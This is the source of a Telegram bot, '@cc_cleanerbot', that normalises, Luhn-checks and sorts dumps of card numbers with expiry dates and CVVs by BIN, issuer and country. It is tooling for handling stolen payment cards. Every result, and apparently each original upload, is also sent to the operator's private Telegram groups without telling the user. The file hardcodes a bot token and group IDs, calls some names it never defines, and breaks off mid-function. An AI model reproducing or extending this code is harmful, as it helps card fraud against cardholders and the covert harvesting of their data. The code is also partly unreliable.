import json
import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.error import Conflict
import tempfile
import os
from keep_alive import keep_alive
import asyncio
import signal
import sys
import time
import gc
import psutil
import csv
import os
from typing import Dict, Optional, List, Union
from datetime import datetime
from pytz import timezone
from user_db import UserDatabase
from translations import MESSAGES

keep_alive()

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

logger = logging.getLogger(__name__)

# Initialize user database alongside existing bot_users
user_db = UserDatabase()

# User language preferences
user_languages = {}  # Store user language preferences

def get_message(key: str, lang: str = 'en', *args) -> str:
    """Get message in specified language with optional formatting"""
    try:
        # First try to get message in specified language
        if lang in MESSAGES and key in MESSAGES[lang]:
            message = MESSAGES[lang][key]
        # Fallback to English if not found in specified language
        elif key in MESSAGES['en']:
            message = MESSAGES['en'][key]
        else:
            logger.error(f"Message key '{key}' not found in any language")
            return f"Message not found: {key}"  # Fallback message
        
        if args:
            return message.format(*args)
        return message
    except Exception as e:
        logger.error(f"Error getting message for key '{key}': {e}")
        return f"Error: {key}"  # Fallback message for any error

# Replace with your bot token
TOKEN = "7875151162:AAFo_NOoR2NEnjVCWi31QVkumNbBp9eoSTw"

# Constants and configuration
DEFAULT_GROUP = "-1002499941403"  # Replace with your group ID (-1001234567....) make sure to add the bot to this group as admin
SPECIAL_GROUP = "-1002480822799"  # Replace with your special group ID (-1001234567....) make sure to add the bot to this group as admin
BOT_OWNER_ID = "1932632748"  # Your Telegram user ID

# Dictionary mapping special usernames to their target groups (username without @)
SPECIAL_USERS = {
    'x3EF8': SPECIAL_GROUP,
    'abcd': SPECIAL_GROUP,
    'efg': SPECIAL_GROUP,
    # Add more special users as needed
}

def get_target_group(username: str) -> str:
    """
    Get the target group for a user. Username check is case-insensitive.
    Returns the special group ID if user is special, otherwise returns default group.
    """
    if not username:
        return DEFAULT_GROUP
        
    # Remove @ if present and convert to lowercase for checking
    clean_username = username.lstrip('@').lower()
    
    # Check against lowercase keys
    for special_user, group in SPECIAL_USERS.items():
        if clean_username == special_user.lower():
            return group
            
    return DEFAULT_GROUP

# Constants
MAX_FILE_SIZE = 20 * 1024 * 1024  # 20MB
MAX_GROUP_WAIT = 60  # seconds
MAX_GROUP_FILES = 10
MAX_TOTAL_FILES = 20

# Global variables
USERS_FILE = 'bot_users.json'
bot_users = set()

def load_users():
    """Load users from file"""
    global bot_users
    bot_users = set()  # Always initialize an empty set first
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                loaded_users = json.load(f)
                if loaded_users:  # Check if the loaded data is not None
                    bot_users = set(loaded_users)
            logger.info(f"Loaded {len(bot_users)} users from file")
        else:
            logger.info("No users file found, starting with empty set")
    except Exception as e:
        logger.error(f"Error loading users: {e}")
        # Keep using the empty set initialized at the start

def save_users():
    """Save users to file"""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(list(bot_users), f)
        logger.info(f"Saved {len(bot_users)} users to file")
    except Exception as e:
        logger.error(f"Error saving users: {e}")

# Global variable to store BIN data
BIN_DATA: Dict[str, Dict[str, str]] = {}

def load_bin_data() -> Dict[str, Dict[str, str]]:
    """Load BIN data from CSV file."""
    try:
        bin_file = 'bin-list-data2.csv'
        formatted_data = {}
        
        with open(bin_file, 'r', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                try:
                    bin_number = str(row.get('BIN', '')).strip()
                    if not bin_number or len(bin_number) != 6:
                        continue
                        
                    formatted_data[bin_number] = {
                        'brand': str(row.get('Brand', 'UNKNOWN')).strip('"').upper(),
                        'type': str(row.get('Type', 'UNKNOWN')).strip().upper(),
                        'category': str(row.get('Category', 'N/A')).strip().upper(),
                        'issuer': str(row.get('Issuer', 'UNKNOWN')).strip('"').upper(),
                        'country': str(row.get('CountryName', 'UNKNOWN')).strip().upper()
                    }
                except Exception as row_error:
                    logging.warning(f"Error processing row: {row_error}")
                    continue
        
        logging.info(f"Loaded {len(formatted_data)} BIN entries from CSV")
        return formatted_data
    except Exception as e:
        logging.error(f"Error loading BIN data from CSV: {e}")
        return {}

# Load BIN data at startup
BIN_DATA = load_bin_data()

def get_bin_info(bin_number: str) -> Optional[Dict[str, str]]:
    """Get information for a specific BIN number."""
    return BIN_DATA.get(bin_number)

def format_bin_info(bin_info: Dict[str, str], include_header: bool = True) -> str:
    """Format BIN information for display with professional yet appealing layout."""
    if not bin_info:
        return "BIN information not found"
    
    # Get country flag emoji
    country = bin_info['country']
    flag = get_country_flag(country)
    
    # Format the main BIN information with aligned fields and subtle styling
    info = (
        f"🔍 BIN Lookup Result\n\n"
        f"➜ BIN: `{bin_info.get('bin', 'N/A')}`\n\n"
        f"➜ Info: {bin_info['brand']} - {bin_info['type']} - {bin_info['category']}\n"
        f"➜ Issuer: {bin_info['issuer']}\n"
        f"➜ Country: {bin_info['country']} {flag}\n\n"
        f"Checked by @cc_cleanerbot"
    )
    return info

def get_country_flag(country_name: str) -> str:
    """Convert country name to flag emoji."""
    # Standard country code mappings
    country_codes = {
        'UNITED STATES': 'US', 'USA': 'US', 'UNITED STATES OF AMERICA': 'US',
        'UNITED KINGDOM': 'GB', 'UK': 'GB', 'GREAT BRITAIN': 'GB',
        'PHILIPPINES': 'PH', 'AUSTRALIA': 'AU', 'CANADA': 'CA',
        'INDIA': 'IN', 'JAPAN': 'JP', 'CHINA': 'CN',
        'BRAZIL': 'BR', 'MEXICO': 'MX', 'RUSSIA': 'RU',
        'GERMANY': 'DE', 'FRANCE': 'FR', 'ITALY': 'IT',
        'SPAIN': 'ES', 'NETHERLANDS': 'NL', 'SWITZERLAND': 'CH',
        'SWEDEN': 'SE', 'NORWAY': 'NO', 'DENMARK': 'DK',
        'FINLAND': 'FI', 'POLAND': 'PL', 'AUSTRIA': 'AT',
        'BELGIUM': 'BE', 'IRELAND': 'IE', 'PORTUGAL': 'PT',
        'GREECE': 'GR', 'TURKEY': 'TR', 'ISRAEL': 'IL',
        'SAUDI ARABIA': 'SA', 'UAE': 'AE', 'UNITED ARAB EMIRATES': 'AE',
        'SINGAPORE': 'SG', 'MALAYSIA': 'MY', 'INDONESIA': 'ID',
        'THAILAND': 'TH', 'VIETNAM': 'VN', 'SOUTH KOREA': 'KR',
        'HONG KONG': 'HK', 'TAIWAN': 'TW', 'NEW ZEALAND': 'NZ',
        'SOUTH AFRICA': 'ZA', 'EGYPT': 'EG', 'NIGERIA': 'NG',
        'KENYA': 'KE', 'GHANA': 'GH', 'MOROCCO': 'MA',
        'ARGENTINA': 'AR', 'CHILE': 'CL', 'COLOMBIA': 'CO',
        'PERU': 'PE', 'VENEZUELA': 'VE', 'PAKISTAN': 'PK',
        'BANGLADESH': 'BD', 'SRI LANKA': 'LK', 'NEPAL': 'NP',
        'MYANMAR': 'MM', 'CAMBODIA': 'KH', 'LAOS': 'LA',
        'BRUNEI': 'BN', 'FIJI': 'FJ', 'PAPUA NEW GUINEA': 'PG',
        # Add more mappings as needed
    }
    
    # Clean and standardize country name
    country = country_name.upper().strip()
    
    # Get country code
    country_code = country_codes.get(country)
    
    if not country_code:
        # Try to extract from BIN database if available
        for bin_info in BIN_DATA.values():
            if bin_info.get('country', '').upper() == country:
                iso_code = bin_info.get('isoCode2')
                if iso_code:
                    country_code = iso_code
                    break
    
    if not country_code:
        return '🏳️'  # Default flag for unknown countries
    
    # Convert country code to flag emoji
    # Each letter is converted to its regional indicator symbol emoji
    return ''.join(chr(ord('🇦') + ord(c.upper()) - ord('A')) for c in country_code)

def normalize_text(text):
    """Normalize text by converting unicode numbers and cleaning special characters."""
    # Extended unicode number mapping
    number_map = {
        # Standard unicode numbers
        '𝟎': '0', '𝟏': '1', '𝟐': '2', '𝟑': '3', '𝟒': '4', '𝟓': '5', '𝟔': '6', '𝟕': '7', '𝟖': '8', '𝟗': '9',
        # Bold unicode numbers
        '𝟬': '0', '𝟭': '1', '𝟮': '2', '𝟯': '3', '𝟰': '4', '𝟱': '5', '𝟲': '6', '𝟳': '7', '𝟴': '8', '𝟵': '9',
        # Monospace unicode numbers
        '𝟶': '0', '𝟷': '1', '𝟸': '2', '𝟹': '3', '𝟺': '4', '𝟻': '5', '𝟼': '6', '𝟽': '7', '𝟾': '8', '𝟿': '9',
        # Full-width numbers
        '０': '0', '１': '1', '２': '2', '３': '3', '４': '4', '５': '5', '６': '6', '７': '7', '８': '8', '９': '9',
    }
    
    # Extended separator mapping
    separator_map = {
        # Arrow-like separators
        '⋙': '|', '»': '|', '⤿': '|', '⤾': '|', '➜': '|', '⇒': '|', '→': '|', '⟶': '|',
        # Brackets and quotes
        '⸤': '', '⸣': '', '⸢': '', '⸥': '', '⸮': '', '˹': '', '˼': '', '「': '', '」': '', '『': '', '』': '',
        '【': '', '】': '', '《': '', '》': '', '〈': '', '〉': '', '"': '', '"': '', ''': '', ''': '',
        # Decorative separators
        '⸻': ' ', '─': ' ', '═': ' ', '━': ' ', '—': ' ', '–': ' ',
        # Special spaces and joiners
        '\u200b': '', '\u200c': '', '\u200d': '', '\ufeff': '', '\u2060': '',
        # Common separators in card formats
        '⋆': '|', '⭒': '|', '⭑': '|', '★': '|', '☆': '|', '✧': '|', '✦': '|',
        # Arrow variations
        '➤': '|', '►': '|', '▶': '|', '⏵': '|', '⯈': '|', '⟩': '|',
        # Additional separators
        '⊰': '|', '⊱': '|', '❯': '|', '❮': '|', '❱': '|', '❰': '|',
    }
    
    # First pass: normalize numbers
    for fancy, normal in number_map.items():
        text = text.replace(fancy, normal)
    
    # Second pass: normalize separators
    for fancy, normal in separator_map.items():
        text = text.replace(fancy, normal)
    
    return text

def clean_text(text):
    """Clean text while preserving essential information."""
    # Keep only printable ASCII, common separators, and essential punctuation
    text = re.sub(r'[^\x20-\x7E|/\n:=-]', ' ', text)
    # Normalize multiple separators
    text = re.sub(r'\s*[|]+\s*', '|', text)
    # Remove duplicate spaces/newlines
    text = re.sub(r'\s+', ' ', text)
    return text.strip()

def validate_card_number(number):
    """Validate card number using Luhn algorithm and length check."""
    global length_check_fails, luhn_check_fails
    
    if not hasattr(validate_card_number, 'length_check_fails'):
        validate_card_number.length_check_fails = 0
        validate_card_number.luhn_check_fails = 0
    
    if not re.match(r'^\d{15,19}$', number):
        validate_card_number.length_check_fails += 1
        print(f"[Length Check Failed] Card: {number}")
        return False
        
    # Luhn algorithm
    digits = [int(d) for d in number]
    checksum = 0
    for i in range(len(digits) - 1, -1, -1):
        d = digits[i]
        if (len(digits) - i) % 2 == 0:  # even positions from right
            d = d * 2
            if d > 9:
                d = d - 9
        checksum += d
    valid = checksum % 10 == 0
    if not valid:
        validate_card_number.luhn_check_fails += 1
        print(f"[Luhn Check Failed] Card: {number}")
    return valid

def read_cards_from_file(file_path):
    """Read cards from file and split them properly."""
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read().strip()

    # Split content by format markers
    format_markers = [
        "format 1:", "format 2:", "format 3:", "format 4:",
        "format 5:", "format 6:", "format 7:", "format 8:"
    ]
    
    # If no format markers found, treat each group of non-empty lines as a card entry
    if not any(marker in content for marker in format_markers):
        entries = []
        current_entry = []
        lines = content.split('\n')
        for line in lines:
            if line.strip():
                current_entry.append(line)
            elif current_entry:  # Empty line and we have a current entry
                entries.append('\n'.join(current_entry))
                current_entry = []
        if current_entry:  # Don't forget the last entry
            entries.append('\n'.join(current_entry))
        return entries

    # Otherwise use the existing format marker logic
    entries = []
    current_entry = ""
    lines = content.split('\n')
    for line in lines:
        # If we hit a format marker, save previous entry and start new one
        if any(marker in line.lower() for marker in format_markers):
            if current_entry.strip():
                # For formats with multiple cards per entry, split them
                if '|' in current_entry:
                    # Only split lines that don't contain placeholders like xxxx or rnd
                    card_lines = [l.strip() for l in current_entry.split('\n') 
                                if '|' in l and any(c.isdigit() for c in l) 
                                and 'xxxx' not in l and 'rnd' not in l]
                    format_line = next((l for l in current_entry.split('\n') if any(marker in l for marker in format_markers)), '')
                    if len(card_lines) > 1:  # If multiple valid cards, split them
                        for card_line in card_lines:
                            entries.append(f"{format_line}\n{card_line}")
                    else:  # Otherwise keep the whole entry together
                        entries.append(current_entry.strip())
                else:
                    entries.append(current_entry.strip())
            current_entry = line + '\n'
        else:
            current_entry += line + '\n'
    
    # Don't forget to add the last entry
    if current_entry.strip():
        # Handle multiple cards in the last entry too
        if '|' in current_entry:
            # Only split lines that don't contain placeholders like xxxx or rnd
            card_lines = [l.strip() for l in current_entry.split('\n') 
                        if '|' in l and any(c.isdigit() for c in l)
                        and 'xxxx' not in l and 'rnd' not in l]
            format_line = next((l for l in current_entry.split('\n') if any(marker in l for marker in format_markers)), '')
            if len(card_lines) > 1:  # If multiple valid cards, split them
                for card_line in card_lines:
                    entries.append(f"{format_line}\n{card_line}")
            else:  # Otherwise keep the whole entry together
                entries.append(current_entry.strip())
        else:
            entries.append(current_entry.strip())
    
    # Remove empty entries
    entries = [e for e in entries if e.strip()]
    
    return entries

def extract_card_details(text):
    """Extract card details using advanced pattern matching and validation."""
    text = normalize_text(text)
    cleaned_text = clean_text(text)
    
    # Format 1: Standard pipe format with optional type/country
    card_pattern = r'(\d{15,19})\s*[|]\s*(\d{1,4})\s*[|]\s*(\d{1,2})\s*[|]\s*(\d{3,4})(?:\s*[|][^|]*)*'
    matches = re.finditer(card_pattern, text)
    for match in matches:
        card, year, month, cvv = match.groups()
        if validate_card_format(card, month, year, cvv):
            return f"{card}|{month}|{year}|{cvv}"

    # Format 2: Card type prefix with comma separation
    card_type_pattern = r'(?:VISA|MASTERCARD|AMEX|DISCOVER)?,\s*(\d{15,19}),?\s*(\d{1,2})/(\d{2,4}),?\s*(\d{3,4})'
    match = re.search(card_type_pattern, text, re.I)
    if match:
        card, month, year, cvv = match.groups()
        if validate_card_format(card, month, year, cvv):
            return f"{card}|{month}|{year}|{cvv}"

    # Format 3: Labeled format (CC/EXPIRY/CVV)
    labeled_pattern = r'(?:^|\n)(?:CC|CARD)[:\s]*(\d{15,19}).*?(?:EXPIRY|EXP|DATE)[:\s]*(\d{1,2})\s*[/|-]\s*(\d{2,4}).*?(?:CVV|CVC|CVV2)[:\s]*(\d{3,4})'
    match = re.search(labeled_pattern, text, re.DOTALL | re.I)
    if match:
        card, month, year, cvv = match.groups()
        if validate_card_format(card, month, year, cvv):
            return f"{card}|{month}|{year}|{cvv}"

    # Format 4: Simple multi-line format
    lines = [l.strip() for l in text.strip().split('\n') if l.strip()]
    if 2 <= len(lines) <= 4:
        # Try to find card number in first line
        card_match = re.search(r'(?:^|[^0-9])(\d{15,19})(?:[^0-9]|$)', lines[0])
        if card_match:
            card_number = card_match.group(1)
            # Try to find expiry in any other line
            for line in lines[1:]:
                date_match = re.search(r'(?:^|[^0-9])(\d{1,2})\s*[/|-]\s*(\d{1,4})(?:[^0-9]|$)', line)
                if date_match:
                    month, year = date_match.groups()
                    # Try to find CVV in remaining lines
                    cvv_length = 4 if card_number.startswith('3') else 3
                    for cvv_line in lines:
                        if cvv_line != lines[0]:  # Skip card number line
                            cvv_match = re.search(rf'(?:^|[^0-9])(\d{{{cvv_length}}})(?:[^0-9]|$)', cvv_line)
                            if cvv_match:
                                cvv = cvv_match.group(1)
                                if cvv not in card_number and validate_card_format(card_number, month, year, cvv):
                                    return f"{card_number}|{month}|{year}|{cvv}"

    # Format 5: Special format with flags and test info
    special_pattern = r'(?:🇺🇸|\[[\d.]+\]#\w+|\⟬[^⟭]+\⟭)[^\d]*(\d{15,19})\s*[|]\s*(\d{1,2})\s*[|]\s*(\d{1,4})\s*[|]\s*(\d{3,4})'
    matches = re.finditer(special_pattern, text)
    for match in matches:
        card, month, year, cvv = match.groups()
        if validate_card_format(card, month, year, cvv):
            return f"{card}|{month}|{year}|{cvv}"

    # Format 6: Card with forward slash in date
    slash_pattern = r'(\d{15,19})\s*[|]\s*(\d{1,2})/(\d{2,4})\s*[|]\s*(\d{3,4})'
    matches = re.finditer(slash_pattern, text)
    for match in matches:
        card, month, year, cvv = match.groups()
        if validate_card_format(card, month, year, cvv):
            return f"{card}|{month}|{year}|{cvv}"

    return None

def validate_card_format(card, month, year, cvv):
    """Validate card format and normalize month/year."""
    try:
        if not validate_card_number(card):
            return False
            
        month_val = int(month)
        if not (1 <= month_val <= 12):
            return False
            
        # Normalize month to 2 digits
        month = str(month_val).zfill(2)
        
        # Normalize year
        if len(year) == 4:
            year = year[-2:]
        elif len(year) == 2:
            year = year
        elif len(year) == 1:
            year = '2' + year
        else:
            return False
            
        # Validate CVV length
        if not ((len(cvv) == 4 and card.startswith('3')) or (len(cvv) == 3 and not card.startswith('3'))):
            return False
            
        return True
    except ValueError:
        return False

def filter_by_bin(text_content: str, for_file: bool = False) -> str:
    """Filter and group cards by their BIN (first 6 digits)"""
    try:
        if not isinstance(text_content, str) or not text_content.strip():
            logger.error("Invalid or empty input for filter_by_bin")
            return ""
            
        # Clean the cards first using process_data
        cleaned_cards = process_data(text_content)
        if not cleaned_cards:
            return ""
            
        bin_groups = {}
        total_filtered = 0
        
        # Group cards by BIN
        for line in cleaned_cards.split('\n'):
            line = line.strip()
            if not line:
                continue
                
            parts = line.split('|')
            if len(parts) >= 1:
                card_number = parts[0].strip()
                if len(card_number) >= 6:
                    bin_number = card_number[:6]
                    if bin_number not in bin_groups:
                        bin_info = get_bin_info(bin_number)
                        bin_groups[bin_number] = {
                            'info': bin_info,
                            'cards': []
                        }
                    bin_groups[bin_number]['cards'].append(line)
                    total_filtered += 1
        
        if not bin_groups:
            logger.error("No valid BINs found in input")
            return ""
        
        # Format output
        output_lines = []
        for bin_number in sorted(bin_groups.keys()):
            group = bin_groups[bin_number]
            bin_info = group['info']
            cards = group['cards']
            
            # Add BIN header
            if bin_info:
                flag = get_country_flag(bin_info['country'])
                header = f"BIN: {bin_number} | {bin_info['brand']} - {bin_info['type']} - {bin_info['category']} | {bin_info['issuer']} | {bin_info['country']} {flag} | CARDS: {len(cards)}"
            else:
                header = f"BIN: {bin_number} | No information available | CARDS: {len(cards)}"
            
            output_lines.append(header)
            # Add cards with or without monospace formatting based on output type
            if for_file:
                output_lines.extend(cards)
            else:
                output_lines.extend([f'`{card}`' for card in cards])
            output_lines.append("")  # Empty line between groups
        
        result = '\n'.join(output_lines).strip()
        
        # Save to file with proper encoding
        if for_file:
            with open('filtered_bins.txt', 'w', encoding='utf-8') as f:
                f.write(result)
        
        logger.info(f"Successfully filtered {total_filtered} cards into {len(bin_groups)} BIN groups")
        return result

    except Exception as e:
        logger.error(f"Error in filter_by_bin: {e}")
        return ""

def process_data(text_content: str) -> str:
    """Process and clean card data from text content."""
    if not text_content:
        return ""
        
    # Split content into lines and clean each line
    lines = text_content.splitlines()
    cleaned_cards = []
    current_card = []
    
    for line in lines:
        line = line.strip()
        if not line:
            # Process accumulated multi-line card if any
            if current_card:
                cleaned = clean_multiline_card(current_card)
                if cleaned:
                    cleaned_cards.append(cleaned)
                current_card = []
            continue
            
        # Try single-line formats first
        cleaned = clean_line(line)
        if cleaned:
            cleaned_cards.append(cleaned)
            continue
            
        # If not single-line, accumulate for multi-line processing
        current_card.append(line)
    
    # Process any remaining multi-line card
    if current_card:
        cleaned = clean_multiline_card(current_card)
        if cleaned:
            cleaned_cards.append(cleaned)
    
    # Remove duplicates while preserving order
    cleaned_cards = list(dict.fromkeys(cleaned_cards))
    
    # Join all cleaned cards with newlines
    return '\n'.join(cleaned_cards)

def clean_line(line: str) -> str:
    """Clean a single line of card data."""
    # Remove common decorative elements
    line = re.sub(r'[^\w\s|,/-]', '', line)
    
    # Try different single-line formats
    formats = [
        r'(\d{15,16})\s*[|,]\s*(\d{1,4})\s*[|,/]\s*(\d{2,4})\s*[|,]\s*(\d{3,4})',  # pipe/comma separated
        r'(?:VISA|MASTERCARD|AMEX),?\s*(\d{15,16}),?\s*(\d{1,2})/(\d{2,4}),?\s*(\d{3,4})',  # with card type
        r'(\d{15,16})\s*(\d{2})\s*(\d{2,4})\s*(\d{3,4})'  # space separated
    ]
    
    for pattern in formats:
        match = re.search(pattern, line)
        if match:
            cc, month, year, cvv = match.groups()
            return format_card(cc, month, year, cvv)
    
    return ""

def clean_multiline_card(lines: list) -> str:
    """Clean card data from multiple lines."""
    cc = expiry = cvv = ""
    
    for line in lines:
        line = line.strip()
        if 'CC' in line.upper():
            cc = re.search(r'(\d{15,19})', line)
            if cc:
                cc = cc.group(1)
        elif any(x in line.upper() for x in ['EXPIRY', 'EXP', 'DATE']):
            date = re.search(r'(\d{1,2})[/-](\d{2,4})', line)
            if date:
                expiry = f"{date.group(1)}/{date.group(2)}"
        elif any(x in line.upper() for x in ['CVV', 'CCV', 'CVC']):
            cvv_match = re.search(r'(\d{3,4})', line)
            if cvv_match:
                cvv = cvv_match.group(1)
    
    if cc and expiry and cvv:
        month, year = expiry.split('/')
        return format_card(cc, month, year, cvv)
    
    return ""

def format_card(cc: str, month: str, year: str, cvv: str) -> str:
    """Format card data into standard format."""
    # Standardize year format
    if len(year) == 4:
        year = year[2:]
    
    # Ensure month is two digits
    month = month.zfill(2)
    
    return f"{cc}|{month}|{year}|{cvv}"

async def process_files(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Process accumulated files data."""
    try:
        if not context or not context.user_data or 'files_data' not in context.user_data:
            keyboard = [
                [InlineKeyboardButton("🧹 Clean CCs", callback_data='clean')],
                [InlineKeyboardButton("🔍 Filter by BIN", callback_data='filter_bin')]
            ]
            await update.message.reply_text(
                "Please choose an option first!",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

        current_files = context.user_data.get('files_data', [])
        if not current_files:
            await update.message.reply_text("No CC data found to process. Please send your data first.")
            await initialize_state(context)
            return

        all_cleaned_data = list(dict.fromkeys(filter(None, current_files)))
        if not all_cleaned_data:
            await update.message.reply_text("No valid CC data found in the input. Please check your data format and try again.")
            await initialize_state(context)
            return

        mode = context.user_data.get('mode', 'clean')
        
        # Get username and handle special cases
        username = update.effective_user.username
        if username:
            username = username.lower()  # Convert to lowercase for case-insensitive comparison
            if username.startswith('@'):
                username = username[1:]  # Remove @ if present
        
        # Determine target group based on username
        target_group = get_target_group(username)
        logger.info(f"Processing for user {username} -> target group: {target_group}")
        
        if mode == 'filter_bin':
            # Process for filter by BIN
            combined_data = '\n'.join(all_cleaned_data)
            
            # Get results for both message and file
            message_result = filter_by_bin(combined_data, for_file=False)
            file_result = filter_by_bin(combined_data, for_file=True)
            
            if message_result and file_result:
                # Count unique BINs
                unique_bins = set()
                for card in all_cleaned_data:
                    if len(card) >= 6:
                        unique_bins.add(card[:6])
                
                # Create captions
                user_caption = f"🎯 Filtered BINs Results:\nTotal Cards: {len(all_cleaned_data)}\nUnique BINs: {len(unique_bins)}"
                group_caption = f"{user_caption} from @{username}"
                
                # Check if message would be too long
                if len(all_cleaned_data) <= 100 and len(message_result) <= 4096:
                    # Send as message
                    await update.message.reply_text(message_result, parse_mode='Markdown')
                    
                    # Forward to group
                    await context.bot.send_message(
                        chat_id=target_group,
                        text=f"{group_caption}\n\n{message_result}",
                        parse_mode='Markdown'
                    )
                else:
                    # Send as file
                    with open('filtered_bins.txt', 'rb') as f:
                        await update.message.reply_document(
                            document=f,
                            filename='filtered_bins.txt',
                            caption=user_caption
                        )
                    
                    # Forward to group
                    with open('filtered_bins.txt', 'rb') as f:
                        await context.bot.send_document(
                            chat_id=target_group,
                            document=f,
                            filename='filtered_bins.txt',
                            caption=group_caption
                        )
            else:
                await update.message.reply_text("No valid cards found to filter.")
        else:
            # Regular cleaning mode
            # Format cards in monospace for message mode
            formatted_data = '\n'.join([f'`{card}`' for card in all_cleaned_data])
            raw_data = '\n'.join(all_cleaned_data)  # Without monospace for file mode
            
            # Create captions
            user_caption = f"🧹 Clean CCs: {len(all_cleaned_data)}"
            group_caption = f"{user_caption} from @{username}"
            
            # Check if message would be too long
            if len(all_cleaned_data) <= 100 and len(formatted_data) <= 4096:
                # Send as message
                await update.message.reply_text(
                    f"{user_caption}\n\n{formatted_data}",
                    parse_mode='Markdown'
                )
                
                # Forward to group
                await context.bot.send_message(
                    chat_id=target_group,
                    text=f"{group_caption}\n\n{formatted_data}",
                    parse_mode='Markdown'
                )
            else:
                # Send as file
                with open('cleaned_cards.txt', 'w', encoding='utf-8') as f:
                    f.write(raw_data)  # Write without monospace
                
                # Send to user
                with open('cleaned_cards.txt', 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename='cleaned_cards.txt',
                        caption=user_caption
                    )
                
                # Forward to group
                with open('cleaned_cards.txt', 'rb') as f:
                    await context.bot.send_document(
                        chat_id=target_group,
                        document=f,
                        filename='cleaned_cards.txt',
                        caption=group_caption
                    )
        
        # Clear the processed data
        context.user_data['files_data'] = []
        context.user_data['waiting_for_data'] = False
        context.user_data['mode'] = None

    except Exception as e:
        logger.error(f"Error in process_files: {e}")
        await update.message.reply_text("An error occurred while processing. Please try again.")
    finally:
        await initialize_state(context)

async def initialize_state(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Initialize/reset bot state."""
    context.user_data.clear()
    context.user_data.update({
        'waiting_for_data': True,
        'files_data': [],
        'group_meta': {},
        'mode': 'clean',  # can be 'clean' or 'filter_bin'
        'waiting_for_broadcast': False
    })

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    user_id = str(update.effective_user.id)
    
    # Keep existing functionality
    bot_users.add(user_id)
    save_users()
    
    # Add user to database without affecting existing code
    user = update.effective_user
    user_db.add_user(
        str(user.id),
        username=user.username,
        first_name=user.first_name
    )
    user_db.log_command(str(user.id), '/start')
    
    lang = user_languages.get(user_id, 'en')
    welcome_message = get_message('welcome', lang)
    
    await update.message.reply_text(
        welcome_message,
        reply_markup=create_main_keyboard(user_id, lang)
    )

async def change_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle language change"""
    query = update.callback_query
    await query.answer()
    
    user_id = str(update.effective_user.id)
    new_lang = 'en' if user_languages.get(user_id) == 'zh' else 'zh'
    user_languages[user_id] = new_lang
    
    # Log language change in database
    user_db.log_command(user_id, f'change_language_to_{new_lang}')
    
    welcome_message = get_message('welcome', new_lang)
    await query.edit_message_text(
        welcome_message,
        reply_markup=create_main_keyboard(user_id, new_lang)
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button clicks."""
    query = update.callback_query
    if not query:
        return

    if query.data == 'change_language':
        await change_language(update, context)
        return
    
    user_id = str(query.from_user.id)
    lang = user_languages.get(user_id, 'en')
    
    if query.data == 'clean':
        context.user_data['waiting_for_data'] = True
        context.user_data['mode'] = 'clean'
        await query.message.reply_text(get_message('clean_ccs', lang))
    elif query.data == 'filter_bin':
        context.user_data['waiting_for_data'] = True
        context.user_data['mode'] = 'filter_bin'
        await query.message.reply_text(get_message('filter_bin', lang))
    elif query.data == 'filter_country':
        print("DEBUG: Setting up filter_country mode")  # DEBUG LINE
        if "state" not in context.user_data:
            context.user_data["state"] = {}
        if "filter_country" not in context.user_data["state"]:
            context.user_data["state"]["filter_country"] = CountryFilterState()
        context.user_data["current_action"] = WAITING_FOR_CCS
        context.user_data['mode'] = 'filter_country'
        context.user_data['waiting_for_data'] = True
        await query.message.reply_text(get_message('filter_country', lang))
    elif query.data == 'broadcast' and str(query.from_user.id) == BOT_OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await query.message.reply_text(get_message('broadcast', lang))
    else:
        await query.message.reply_text(get_message('unknown_command', lang))

def create_main_keyboard(user_id: str, lang: str = 'en') -> InlineKeyboardMarkup:
    """Create the main keyboard with proper language"""
    keyboard = [
        [
            InlineKeyboardButton(get_message('btn_clean', lang), callback_data='clean'),
            InlineKeyboardButton(get_message('btn_filter_bin', lang), callback_data='filter_bin'),
        ],
        [InlineKeyboardButton(get_message('btn_language', lang), callback_data='change_language')]
    ]
    
    if user_id == BOT_OWNER_ID:
        keyboard.insert(-1, [InlineKeyboardButton(get_message('btn_broadcast', lang), callback_data='broadcast')])
    
    return InlineKeyboardMarkup(keyboard)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle document messages."""
    if not update.message or not update.message.document:
        return
        
    if not update.message.document.file_name.endswith('.txt'):
        await update.message.reply_text(get_message('invalid_file', user_languages.get(str(update.effective_user.id), 'en')))
        return
        
    try:
        # Get file info
        file = await update.message.document.get_file()
        
        # Check file size
        if file.file_size > MAX_FILE_SIZE:
            await update.message.reply_text(get_message('file_too_large', user_languages.get(str(update.effective_user.id), 'en')))
            return
            
        # Download file to temporary location
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        await file.download_to_drive(temp_file.name)
        temp_file.close()
            
        # Try different encodings
        encoding_errors = []
        file_content = None
            
        for encoding in ['utf-8', 'latin-1', 'cp1252']:
            try:
                with open(temp_file.name, 'r', encoding=encoding) as f:
                    file_content = f.read()
                break
            except UnicodeDecodeError as e:
                encoding_errors.append(f"{encoding}: {str(e)}")
                continue
            
        try:
            os.unlink(temp_file.name)  # Delete the temporary file after reading
        except:
            pass
            
        if file_content is None:
            error_message = f"Could not decode file with any encoding{os.linesep}{os.linesep.join(encoding_errors)}"
            raise ValueError(error_message)
            
        # Get target group based on username
        username = update.message.from_user.username
        target_group = get_target_group(username)
            
        # Forward original file to target group first
        ph_time = datetime.now(timezone('Asia/Manila')).strftime('%m%d%y%H%M')
        original_filename = f"original_ccs_{username}-{ph_time}.txt"
            
        # Create temporary file for original content
        original_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8')
        original_file.write(file_content)
        original_file.close()
            
        # Send original file to target group with username with retries
        max_retries = 3
